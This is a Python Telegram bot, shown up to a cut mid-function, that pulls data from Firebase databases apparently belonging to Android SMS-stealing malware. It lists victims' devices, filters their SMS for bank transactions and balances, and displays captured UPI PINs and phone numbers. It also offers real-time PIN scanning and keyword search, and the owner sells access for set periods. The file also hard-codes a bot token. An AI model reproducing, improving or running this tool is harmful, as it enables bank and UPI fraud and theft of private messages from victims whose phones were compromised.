import os
import re
import json
import asyncio
import logging
import sqlite3
from datetime import datetime, timedelta

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
)
from telegram.request import HTTPXRequest

# ══════════════════════════════════════════════════════
# ⚙️ CONFIGURATION
# ══════════════════════════════════════════════════════
BOT_TOKEN = "9207432550:AAHLuB2y4UHBx3n14eMUERY99S_vBr1nCc4"
OWNER_ID = 8866149676
OWNER_USERNAME = "@MR_GYANI_9"

CHANNEL_LINK = "https://t.me/MR_GYANI_0"

DATA_DIR = "./data"
os.makedirs(DATA_DIR, exist_ok=True)
DB_PATH = os.path.join(DATA_DIR, "users.db")

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════
# 🎯 TASK TRACKING (STOP FIX + MULTI-USER SAFE)
# ══════════════════════════════════════════════════════
ACTIVE_TASKS = {}   # {user_id: asyncio.Task}

# ══════════════════════════════════════════════════════
# 🌐 SHARED HTTP SESSION (SPEED BOOST)
# ══════════════════════════════════════════════════════
_HTTP = None
_HTTP_LOCK = asyncio.Lock()

async def get_http():
    global _HTTP
    async with _HTTP_LOCK:
        if _HTTP is None or _HTTP.closed:
            conn = aiohttp.TCPConnector(limit=150, ttl_dns_cache=300, force_close=False)
            _HTTP = aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10))
        return _HTTP

async def close_http():
    global _HTTP
    if _HTTP and not _HTTP.closed:
        await _HTTP.close()
        _HTTP = None

# ══════════════════════════════════════════════════════
# 🗄️ DATABASE
# ══════════════════════════════════════════════════════
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, name TEXT, username TEXT, expiry TEXT, banned INTEGER)''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN username TEXT")
    except sqlite3.OperationalError:
        pass
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT expiry, banned FROM users WHERE user_id = ?", (user_id,))
    res = c.fetchone()
    conn.close()
    if res:
        return {"expiry": res[0], "banned": bool(res[1])}
    return None

def add_user(user_id, name, username):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, name, username, expiry, banned) VALUES (?, ?, ?, NULL, 0)", (user_id, name, username))
    conn.commit()
    conn.close()

def approve_user_db(user_id, days=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    expiry_str = "lifetime" if days is None else (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    c.execute("UPDATE users SET expiry = ?, banned = 0 WHERE user_id = ?", (expiry_str, user_id))
    conn.commit()
    conn.close()

# ══════════════════════════════════════════════════════
# 🧠 PER-USER STATE
# ══════════════════════════════════════════════════════
USER_STATES = {}
VERIFIED_USERS = set()

def get_user_state(user_id):
    if user_id not in USER_STATES:
        USER_STATES[user_id] = {
            "firebases": {}, "device_state": {}, "scan_active": False,
            "search_active": False, "upi_active": False, "kill_switch": asyncio.Event(),
            "filter_min": 0.0, "filter_max": 0.0
        }
    return USER_STATES[user_id]

async def _cancel_user_tasks(user_id):
    """User ke saare tasks safely cancel karo — STOP ka asli fix"""
    task = ACTIVE_TASKS.pop(user_id, None)
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        except Exception as e:
            logger.warning(f"cancel warn user={user_id}: {e}")
    st = get_user_state(user_id)
    st["scan_active"] = False
    st["search_active"] = False
    st["upi_active"] = False
    st["kill_switch"] = asyncio.Event()
    return st

# ══════════════════════════════════════════════════════
# 🔐 AUTH GUARD — har action se pehle check
# ══════════════════════════════════════════════════════
async def check_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    """Return True = allowed, False = already replied with reason"""
    uid = update.effective_user.id

    if uid == OWNER_ID:
        return True

    user = get_user(uid)

    if not user:
        await update.effective_message.reply_text(
            f"⛔ <b>ACCESS DENIED</b>\n\n"
            f"Send /start to register.\n"
            f"Your ID: <code>{uid}</code>\n"
            f"Owner: {OWNER_USERNAME}",
            parse_mode="HTML")
        return False

    if user.get("banned"):
        await update.effective_message.reply_text(
            f"🚫 <b>YOU ARE BANNED!</b>\n\n"
            f"<i>Contact owner to unban: {OWNER_USERNAME}</i>",
            parse_mode="HTML")
        return False

    expiry = user.get("expiry")
    if not expiry:
        await update.effective_message.reply_text(
            f"⛔ <b>NO ACCESS!</b>\n\n"
            f"Contact owner: {OWNER_USERNAME}",
            parse_mode="HTML")
        return False

    if expiry != "lifetime":
        try:
            if datetime.strptime(expiry, "%Y-%m-%d %H:%M:%S") < datetime.now():
                await update.effective_message.reply_text(
                    f"⏳ <b>ACCESS EXPIRED!</b>\n\n"
                    f"Renew with owner: {OWNER_USERNAME}",
                    parse_mode="HTML")
                return False
        except: pass

    if uid not in VERIFIED_USERS:
        join_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📢 JOIN CHANNEL", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="✅ VERIFY MEMBERSHIP", callback_data="btn_verify_join")]
        ])
        await update.effective_message.reply_text(
            f"⚠️ <b>CHANNEL VERIFICATION REQUIRED</b>\n\n"
            f"Join channel then click Verify.",
            reply_markup=join_kb, parse_mode="HTML")
        return False

    return True

# ══════════════════════════════════════════════════════
# 🚫 PARSERS & FILTERS
# ══════════════════════════════════════════════════════
MUST_HAVE_BANK_WORDS = re.compile(
    r'(avl\s*bal|available\s*bal|credited|debited|withdrawn|deposited|'
    r'a/?c\s*(no|num|ending|\*)|account\s*ending|'
    r'txn|transaction|upi|imps|neft|'
    r'balance\s*(is|:)|card\s*(no|ending|\*))', re.IGNORECASE)

BLACKLIST_WORDS = re.compile(
    r'(do not copy|forward or share|welcome back|porting|best network|'
    r'recharge|quota|validity|data\s*usage|pack\s*valid|sms\s*cost|'
    r'gb/day|unlimited|benefits|thank you for choosing|'
    r'airtel\s*mobile|jio\s*number|vi\s*number|team\s*jio|team\s*airtel|'
    r'ppx|ppxUhp|track|survey|offer|free)', re.IGNORECASE)

def is_bank_sms(text: str) -> bool:
    if not text or len(text) < 20: return False
    if BLACKLIST_WORDS.search(text): return False
    if MUST_HAVE_BANK_WORDS.search(text) and re.search(r'\d', text):
        if "otp" in text.lower() and "bal" not in text.lower() and "debited" not in text.lower():
            return False
        return True
    return False

def extract_balance_float(text: str) -> float:
    patterns = [
        r'(?:avl|available)\s*(?:bal|balance)?\s*[:=]?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)',
        r'(?:balance|bal)\s*(?:is|:|=)?\s*(?:rs\.?|inr|₹)?\s*([\d,]+(?:\.\d{1,2})?)'
    ]
    for pat in patterns:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            try: return float(m.group(1).replace(",", ""))
            except: pass
    return -1.0

def extract_amount_float(text: str) -> float:
    t = text.replace("Avl Bal", "XXX").replace("available balance", "XXX").replace("Balance", "XXX")
    m = re.search(r'(?:rs\.?|inr|₹)\s*([\d,]+(?:\.\d{1,2})?)', t, re.IGNORECASE)
    if m:
        try: return float(m.group(1).replace(",", ""))
        except: pass
    return -1.0

def parse_sms_date(ts_str: str) -> datetime:
    if not ts_str: return datetime.now()
    s = str(ts_str).strip()
    if s.isdigit() and len(s) >= 13:
        try: return datetime.fromtimestamp(int(s) / 1000.0)
        except: pass
    if s.isdigit() and len(s) == 10:
        try: return datetime.fromtimestamp(int(s))
        except: pass
    formats = ["%d-%m-%Y %H:%M:%S", "%d-%m-%Y %H:%M", "%d-%m-%Y", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%Y-%m-%d"]
    for fmt in formats:
        try:
            dt = datetime.strptime(s, fmt)
            if dt.year < 2000: dt = dt.replace(year=dt.year + 2000)
            return dt
        except: pass
    return datetime.now()

def is_recent(ts_str: str, days=30) -> bool:
    try:
        dt = parse_sms_date(ts_str)
        return dt >= (datetime.now() - timedelta(days=days)) or dt > datetime.now() 
    except: return True

# ══════════════════════════════════════════════════════
# FIREBASE HELPERS
# ══════════════════════════════════════════════════════
async def fb_get(url: str, path: str, timeout=6):
    try:
        session = await get_http()
        async with session.get(f"{url}/{path}.json", timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                txt = await r.text()
                if txt and txt != "null": return json.loads(txt)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.debug(f"fb_get fail {url}/{path}: {e}")
    return None

async def validate_firebase(url: str) -> bool:
    for target in [f"{url}/clients.json", f"{url}/.json"]:
        try:
            session = await get_http()
            async with session.get(target, timeout=aiohttp.ClientTimeout(total=5)) as r:
                if r.status == 200: return True
        except: pass
    return False

def parse_devices(data) -> list:
    devs = []
    if not data or not isinstance(data, dict): return devs
    for dev_id, d in data.items():
        if not isinstance(d, dict) or not d.get("status"): continue
        sims = d.get("sims") or []
        if isinstance(sims, dict): sims = list(sims.values())
        devs.append({"id": dev_id, "model": d.get("modelName") or dev_id, "battery": d.get("battery", "?"), "mobNo": d.get("mobNo", ""), "sims": sims, "upipin": d.get("upipin", "")})
    return devs

def parse_msgs(data) -> list:
    msgs = []
    if not data: return msgs
    items = data if isinstance(data, list) else list(data.values()) if isinstance(data, dict) else []
    for m in items:
        if isinstance(m, dict):
            txt = m.get("message") or m.get("body") or m.get("text") or ""
            sender = m.get("sender") or m.get("from") or ""
            ts = str(m.get("timestamp") or m.get("date") or "")
            ts_val = 0
            try: ts_val = float(ts.replace("-", ""))
            except: pass
            if txt: msgs.append({"message": txt, "sender": sender, "timestamp": ts, "_ts": ts_val})
    msgs.sort(key=lambda x: x["_ts"], reverse=True)
    return msgs

# ══════════════════════════════════════════════════════
# 🎨 CARDS
# ══════════════════════════════════════════════════════
def format_deep_scan_card(fb_label: str, dev: dict, bank_msgs: list) -> str:
    pin = str(dev.get("upipin", "")).split("|")[0].strip()
    carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
    mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
    
    lines = [
        f"📁 <b>DATABASE:</b> <code>{fb_label}</code>",
        f"🆔 <b>DEVICE ID:</b> <code>{dev['id']}</code>",
        f"📱 <b>MOBILE:</b> {mob} ({carrier})",
        f"📲 <b>MODEL:</b> {dev['model']}",
        f"🔋 <b>BATTERY:</b> {dev['battery']}%",
    ]
    if pin: lines.append(f"🔐 <b>UPI PIN:</b> <code>{pin}</code>")
    
    lines.append("\n🏦 <b>BANK TRANSACTIONS:</b>")
    lines.append("━━━━━━━━━━━━━━━━━━━━")
    
    for i, sms in enumerate(bank_msgs, 1):
        txt = sms['message']
        bal, amt = extract_balance_float(txt), extract_amount_float(txt)
        
        if "debit" in txt.lower(): txn_type = "🔴 <b>DEBITED</b>"
        elif "credit" in txt.lower(): txn_type = "🟢 <b>CREDITED</b>"
        else: txn_type = "💳 <b>TRANSACTION</b>"
            
        lines.append(f"<b>{i}. {txn_type}</b>")
        if amt >= 0: lines.append(f"   💰 <b>Amount:</b> ₹{amt:g}")
        if bal >= 0: lines.append(f"   💵 <b>Balance:</b> ₹{bal:g}")
        lines.append(f"   📩 <b>Source:</b> {sms['sender']}")
        lines.append(f"   📄 <i>{txt[:120]}...</i>")
        lines.append("────────────────────")
    return "\n".join(lines)

def format_upi_card(fb_label: str, dev: dict) -> str:
    pin = str(dev.get("upipin", "")).split("|")[0].strip()
    carrier = dev["sims"][0].get("carrierName") if dev["sims"] else "—"
    mob = dev['mobNo'] if dev['mobNo'] else "Not Available"
    return (
        f"🔐 <b>UPI PIN DETECTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📁 <b>DATABASE:</b> <code>{fb_label}</code>\n"
        f"🆔 <b>DEVICE ID:</b> <code>{dev['id']}</code>\n"
        f"📱 <b>MOBILE:</b> {mob} ({carrier})\n"
        f"📲 <b>MODEL:</b> {dev['model']}\n"
        f"🔋 <b>BATTERY:</b> {dev['battery']}%\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>PIN:</b> <code>{pin}</code>\n"
        f"📄 <b>RAW:</b> <i>{dev.get('upipin')}</i>"
    )

# ══════════════════════════════════════════════════════
# 🎛 MENUS
# ══════════════════════════════════════════════════════
def get_main_menu(user_id):
    keyboard = [
        [KeyboardButton("⚡ START SCAN"), KeyboardButton("🛑 STOP SCAN")],
        [KeyboardButton("⚙️ SET FILTER"), KeyboardButton("🫆 UPI PIN SCAN")],
        [KeyboardButton("🔍 CUSTOM SEARCH"), KeyboardButton("🗑 CLEAR ALL")],
        [KeyboardButton("📁 SEND TXT FILE"), KeyboardButton("🔗 PASTE URL")]
    ]
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("👑 ADMIN PANEL")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, is_persistent=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📊 STATS"), KeyboardButton("👥 ALL USERS")],
        [KeyboardButton("➕ GIVE ACCESS"), KeyboardButton("🚫 REMOVE ACCESS")],
        [KeyboardButton("📢 BROADCAST")],
        [KeyboardButton("🔙 BACK TO PANEL")]
    ], resize_keyboard=True)

def get_days_kb(target_id, admin_mode=False):
    prefix = "admin_set" if admin_mode else "approve_set"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📅 1 DAY", callback_data=f"{prefix}_1_{target_id}"),
         InlineKeyboardButton(text="📅 7 DAYS", callback_data=f"{prefix}_7_{target_id}")],
        [InlineKeyboardButton(text="📅 30 DAYS", callback_data=f"{prefix}_30_{target_id}"),
         InlineKeyboardButton(text="♾️ LIFETIME", callback_data=f"{prefix}_life_{target_id}")],
        [InlineKeyboardButton(text="🔙 CANCEL", callback_data="admin_back_dashboard")]
    ])

# ══════════════════════════════════════════════════════
# 🚀 /start
# ══════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    name = update.effective_user.first_name
    username = update.effective_user.username

    if user_id == OWNER_ID:
        welcome_text = (
            f"👋 <b>WELCOME OWNER, {name.upper()}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔒 <b>Status:</b> Owner\n"
            f"⏳ <b>Validity:</b> ♾️ Lifetime\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 <i>Use the menu below.</i>"
        )
        return await update.message.reply_text(welcome_text, reply_markup=get_main_menu(user_id), parse_mode="HTML")

    user = get_user(user_id)

    if not user:
        add_user(user_id, name, username)
        try:
            profile_link = f"tg://user?id={user_id}"
            notify_text = (
                f"🚨 <b>NEW USER DETECTED!</b>\n\n"
                f"👤 <b>Name:</b> {name}\n"
                f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🔗 <b>Username:</b> @{username if username else 'None'}\n\n"
                f"👇 <i>Click below to approve:</i>"
            )
            notify_kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="👤 VIEW PROFILE", url=profile_link)],
                [InlineKeyboardButton(text="✅ APPROVE USER", callback_data=f"notify_approve_{user_id}")],
                [InlineKeyboardButton(text="🚫 REJECT/BAN", callback_data=f"notify_reject_{user_id}")]
            ])
            await ctx.bot.send_message(chat_id=OWNER_ID, text=notify_text, reply_markup=notify_kb, parse_mode="HTML")
        except: pass

        return await update.message.reply_text(
            f"⛔ <b>ACCESS DENIED!</b>\n\n"
            f"<b>You are not authorized to use this bot.</b>\n\n"
            f"Your Telegram User ID: <code>{user_id}</code>\n"
            f"<i>Send this ID to the bot owner for access.</i>\n\n"
            f"👑 <b>Owner :</b> {OWNER_USERNAME}",
            parse_mode="HTML")

    if not await check_auth(update, ctx):
        return

    welcome_text = (
        f"👋 <b>WELCOME, {name.upper()}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔒 <b>Account Status:</b> Active\n"
        f"⏳ <b>Validity:</b> {user.get('expiry')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💡 <i>Use the fixed menu below to control the bot.</i>"
    )
    await update.message.reply_text(welcome_text, reply_markup=get_main_menu(user_id), parse_mode="HTML")

# ══════════════════════════════════════════════════════
# 🎛 CALLBACK HANDLER
# ══════════════════════════════════════════════════════
async def handle_inline_buttons(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    action = query.data

    if action == "btn_verify_join":
        VERIFIED_USERS.add(user_id)
        await query.answer("✅ Verified Successfully!", show_alert=False)
        try: await query.message.delete()
        except: pass
        
        name = query.from_user.first_name
        user = get_user(user_id)
        expiry = "lifetime" if user_id == OWNER_ID else (user.get("expiry") if user else "None")
        
        welcome_text = (
            f"👋 <b>WELCOME, {name.upper()}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔒 <b>Account Status:</b> Active\n"
            f"⏳ <b>Validity:</b> {expiry}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💡 <i>Use the fixed menu below to control the bot.</i>"
        )
        await query.message.reply_text(welcome_text, reply_markup=get_main_menu(user_id), parse_mode="HTML")
        return

    await query.answer()

    if action.startswith("notify_") and user_id == OWNER_ID:
        parts = action.split("_")
        sub_action = parts[1]
        target_id = int(parts[2])
        
        if sub_action == "approve":
            await query.message.edit_text(f"👤 <b>User <code>{target_id}</code> found.</b>\n\n⏳ <b>Select Access Duration:</b>", reply_markup=get_days_kb(target_id, admin_mode=False), parse_mode="HTML")
        elif sub_action == "reject":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("UPDATE users SET banned = 1 WHERE user_id = ?", (target_id,))
            conn.commit()
            conn.close()
            await _cancel_user_tasks(target_id)
            await query.message.edit_text(f"🚫 <b>USER REJECTED!</b>\n\nUser: <code>{target_id}</code> has been banned.", parse_mode="HTML")

    elif action.startswith("admin_set_") and user_id == OWNER_ID:
        parts = action.split("_")
        sub_action = parts[2]
        target_id = int(parts[3])
        days = None if sub_action == "life" else int(sub_action)
        approve_user_db(target_id, days)
        exp_text = "♾️ Lifetime" if days is None else f"{days} Days"
        await query.message.edit_text(f"✅ <b>ACCESS GRANTED!</b>\n\n👤 User: <code>{target_id}</code>\n⏳ Expiry: {exp_text}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back to Panel", callback_data="admin_back_dashboard")]]), parse_mode="HTML")

    elif action.startswith("approve_set_") and user_id == OWNER_ID:
        parts = action.split("_")
        sub_action = parts[2]
        target_id = int(parts[3])
        days = None if sub_action == "life" else int(sub_action)
        approve_user_db(target_id, days)
        exp_text = "♾️ Lifetime" if days is None else f"{days} Days"
        await query.message.edit_text(f"✅ <b>ACCESS GRANTED!</b>\n\n👤 User: <code>{target_id}</code>\n⏳ Expiry: {exp_text}", parse_mode="HTML")
        try: await ctx.bot.send_message(chat_id=target_id, text=f"✅ <b>Your access has been approved!</b>\nDuration: {exp_text}\nSend /start to begin.", parse_mode="HTML")
        except: pass

    elif action == "admin_back_dashboard":
        await query.message.edit_text("👑 <b>ADMIN CONTROL PANEL</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

# ══════════════════════════════════════════════════════
# 📝 TEXT HANDLER
# ══════════════════════════════════════════════════════
async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # 🔐 AUTH GUARD — sabse pehle
    if not await check_auth(update, ctx):
        return

    state = get_user_state(user_id)

    # --- FIXED KEYBOARD BUTTONS ---
    if text == "⚡ START SCAN":
        await _cancel_user_tasks(user_id)
        state = get_user_state(user_id)
        state["scan_active"] = True
        task = asyncio.create_task(background_scanner(ctx.bot, user_id, state))
        ACTIVE_TASKS[user_id] = task
        return await update.message.reply_text(f"⚡ <b>SCANNER STARTED</b>\nFilter: ₹{state['filter_min']} to ₹{state['filter_max'] if state['filter_max'] > 0 else '∞'}", parse_mode="HTML")

    elif text == "🛑 STOP SCAN":
        await _cancel_user_tasks(user_id)
        return await update.message.reply_text("🛑 <b>ALL PROCESSES STOPPED</b>", parse_mode="HTML")

    elif text == "⚙️ SET FILTER":
        await update.message.reply_text("⚙️ <b>ENTER MIN & MAX AMOUNT</b>\n\nExample: <code>100 5000</code>", parse_mode="HTML")
        ctx.user_data["awaiting_filter"] = True
        return

    elif text == "🫆 UPI PIN SCAN":
        await _cancel_user_tasks(user_id)
        state = get_user_state(user_id)
        state["upi_active"] = True
        task = asyncio.create_task(scan_upi_pins(ctx, user_id, state))
        ACTIVE_TASKS[user_id] = task
        await update.message.reply_text("🫆 <b>REALTIME UPI PIN SCAN STARTED...</b>", parse_mode="HTML")
        return

    elif text == "🔍 CUSTOM SEARCH":
        await update.message.reply_text("🔍 <b>TYPE THE KEYWORD TO SEARCH:</b>", parse_mode="HTML")
        ctx.user_data["awaiting_search"] = True
        return

    elif text == "🗑 CLEAR ALL":
        await _cancel_user_tasks(user_id)
        state = get_user_state(user_id)
        state["firebases"].clear()
        state["device_state"].clear()
        return await update.message.reply_text("🗑 <b>DATA CLEARED SUCCESSFULLY</b>", parse_mode="HTML")

    elif text == "🔗 PASTE URL":
        return await update.message.reply_text("🔗 <b>PASTE YOUR FIREBASE URL:</b>\n\n<i>Send the URL as a message.</i>", parse_mode="HTML")

    elif text == "📁 SEND TXT FILE":
        return await update.message.reply_text("📁 <b>SEND YOUR .TXT FILE NOW:</b>\n\n<i>Upload a .txt file containing Firebase URLs.</i>", parse_mode="HTML")

    # --- ADMIN FIXED BUTTONS ---
    if user_id == OWNER_ID:
        if text == "👑 ADMIN PANEL":
            return await update.message.reply_text("👑 <b>ADMIN CONTROL PANEL</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

        elif text == "🔙 BACK TO PANEL":
            return await update.message.reply_text("🎛 <b>USER CONTROL PANEL</b>", reply_markup=get_main_menu(user_id), parse_mode="HTML")

        elif text == "📊 STATS":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM users WHERE banned = 1")
            banned = c.fetchone()[0]
            c.execute("SELECT expiry FROM users WHERE expiry IS NOT NULL AND expiry != 'lifetime'")
            active = 0
            for row in c.fetchall():
                try:
                    if datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S") > datetime.now(): active += 1
                except: pass
            conn.close()
            return await update.message.reply_text(f"📊 <b>BOT STATISTICS</b>\n\n👥 Total Users: <b>{total}</b>\n🟢 Active: <b>{active}</b>\n🚫 Banned: <b>{banned}</b>", parse_mode="HTML")

        elif text == "👥 ALL USERS":
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT user_id, name, expiry, banned FROM users LIMIT 30")
            users = c.fetchall()
            conn.close()
            if not users:
                return await update.message.reply_text("❌ No users found!", parse_mode="HTML")
            
            res_text = "👥 <b>RECENT 30 USERS</b>\n\n"
            for u in users:
                uid, name, exp, ban = u
                exp = exp if exp else "None"
                st = "🚫" if ban else "✅"
                res_text += f"{st} <a href='tg://user?id={uid}'>{name}</a> (<code>{uid}</code>) | Exp: {exp}\n"
            return await update.message.reply_text(res_text, parse_mode="HTML")

        elif text == "➕ GIVE ACCESS":
            await update.message.reply_text("🔍 <b>ENTER USER ID TO GRANT ACCESS:</b>\n\n(Send the User ID as a message)", parse_mode="HTML")
            ctx.user_data["awaiting_admin_user_id"] = True
            return

        elif text == "🚫 REMOVE ACCESS":
            await update.message.reply_text("🚫 <b>ENTER USER ID TO REMOVE ACCESS:</b>\n\n(Send the User ID as a message)", parse_mode="HTML")
            ctx.user_data["awaiting_admin_ban_id"] = True
            return

        elif text == "📢 BROADCAST":
            await update.message.reply_text("📢 <b>ENTER BROADCAST MESSAGE:</b>\n\n(This will be sent to all users)", parse_mode="HTML")
            ctx.user_data["awaiting_admin_broadcast"] = True
            return

        # --- ADMIN TEXT STATES ---
        if ctx.user_data.get("awaiting_admin_user_id"):
            ctx.user_data["awaiting_admin_user_id"] = False
            try:
                target_id = int(update.message.text)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("SELECT name FROM users WHERE user_id = ?", (target_id,))
                if not c.fetchone():
                    conn.close()
                    return await update.message.reply_text("❌ <b>USER NOT FOUND!</b>\nUser must start the bot first.", parse_mode="HTML")
                conn.close()
                await update.message.reply_text(f"👤 User <code>{target_id}</code> found.\n\n⏳ <b>Select Duration:</b>", reply_markup=get_days_kb(target_id, admin_mode=True), parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ <b>INVALID ID!</b> Please send numbers only.", parse_mode="HTML")
            return
            
        elif ctx.user_data.get("awaiting_admin_ban_id"):
            ctx.user_data["awaiting_admin_ban_id"] = False
            try:
                target_id = int(update.message.text)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET banned = 1, expiry = NULL WHERE user_id = ?", (target_id,))
                conn.commit()
                conn.close()
                await _cancel_user_tasks(target_id)
                await update.message.reply_text(f"🚫 <b>USER BANNED!</b>\n\nUser <code>{target_id}</code> has been banned & scanner stopped.", parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ <b>INVALID ID!</b>", parse_mode="HTML")
            return
            
        elif ctx.user_data.get("awaiting_admin_broadcast"):
            ctx.user_data["awaiting_admin_broadcast"] = False
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT user_id FROM users")
            users = c.fetchall()
            conn.close()
            
            msg = await update.message.reply_text(f"⏳ <b>Broadcasting to {len(users)} users...</b>", parse_mode="HTML")
            success, fail = 0, 0
            for u in users:
                try:
                    await update.message.copy_to(chat_id=u[0])
                    success += 1
                    await asyncio.sleep(0.05)
                except: fail += 1
            await msg.edit_text(f"✅ <b>BROADCAST COMPLETE</b>\n\n🟢 Sent: {success}\n🔴 Failed: {fail}", parse_mode="HTML")
            return

    # --- USER INPUT STATES ---
    if ctx.user_data.get("awaiting_filter"):
        ctx.user_data["awaiting_filter"] = False
        try:
            parts = text.split()
            state["filter_min"], state["filter_max"] = float(parts[0]), float(parts[1]) if len(parts) > 1 else 0.0
            await update.message.reply_text(f"✅ <b>FILTER APPLIED</b>\nMin: ₹{state['filter_min']} | Max: ₹{state['filter_max']}", parse_mode="HTML")
        except: await update.message.reply_text("❌ <b>INVALID FORMAT!</b> Example: <code>100 5000</code>", parse_mode="HTML")
        return

    if ctx.user_data.get("awaiting_search"):
        ctx.user_data["awaiting_search"] = False
        await perform_realtime_search(update, ctx, text, state)
        return
    
    await process_urls(update, ctx, text)

# ══════════════════════════════════════════════════════
# 📁 DOCUMENT HANDLER
# ══════════════════════════════════════════════════════
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # 🔐 AUTH GUARD
    if not await check_auth(update, ctx):
        return

    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        return await update.message.reply_text("❌ <b>ONLY .TXT FILES ARE ALLOWED!</b>", parse_mode="HTML")
    msg = await update.message.reply_text("⏳ <b>READING FILE...</b>", parse_mode="HTML")
    file = await ctx.bot.get_file(doc.file_id)
    file_path = os.path.join(DATA_DIR, f"temp_{user_id}.txt")
    await file.download_to_drive(file_path)
    with open(file_path, 'r', encoding='utf-8') as f: content = f.read()
    os.remove(file_path)
    await process_urls(update, ctx, content, msg)

# ══════════════════════════════════════════════════════
# 🔍 SEARCH
# ══════════════════════════════════════════════════════
async def perform_realtime_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE, keyword: str, state):
    state["search_active"] = True
    state["scan_active"] = False
    local_kill = state["kill_switch"] 
    msg = await update.message.reply_text(f"⚡ <b>SEARCHING FOR '{keyword}'...</b>", parse_mode="HTML")
    found_count = 0
    try:
        for fb in list(state["firebases"].values()):
            if local_kill.is_set(): break
            data = await fb_get(fb["url"], "clients", timeout=5)
            if not data or local_kill.is_set(): continue
            online_devices = parse_devices(data)
            results = await asyncio.gather(*[fb_get(fb["url"], f"messages/{dev['id']}", timeout=4) for dev in online_devices], return_exceptions=True)
            for dev, mdata in zip(online_devices, results):
                if local_kill.is_set(): break
                if not mdata or isinstance(mdata, Exception): continue
                msgs = parse_msgs(mdata)
                matches = [m for m in msgs if keyword.lower() in m["message"].lower() and is_recent(m["timestamp"])]
                if not matches: continue
                pin = str(dev.get("upipin", "")).split("|")[0].strip()
                card = f"🎯 <b>MATCH FOUND</b>\n"
                card += f"📁 <b>DB:</b> <code>{fb['label']}</code> | 🆔 <b>ID:</b> <code>{dev['id']}</code>\n"
                card += f"📱 {dev['mobNo']} | 📲 {dev['model']}\n"
                if pin: card += f"🔐 <b>UPI PIN:</b> <code>{pin}</code>\n"
                card += "━━━━━━━━━━━━━━━━━━━━\n"
                for i, m in enumerate(matches[:3], 1): card += f"<b>{i}.</b> <i>{m['message'][:150]}...</i>\n\n"
                try:
                    await update.message.reply_text(card, parse_mode="HTML")
                    found_count += 1
                except: pass
        if local_kill.is_set():
            try: await msg.edit_text("🛑 <b>SEARCH STOPPED</b>", parse_mode="HTML")
            except: pass
        else:
            state["search_active"] = False
            await msg.edit_text(f"✅ <b>SEARCH COMPLETE</b>\nFound <b>{found_count}</b> devices.", parse_mode="HTML")
    except asyncio.CancelledError:
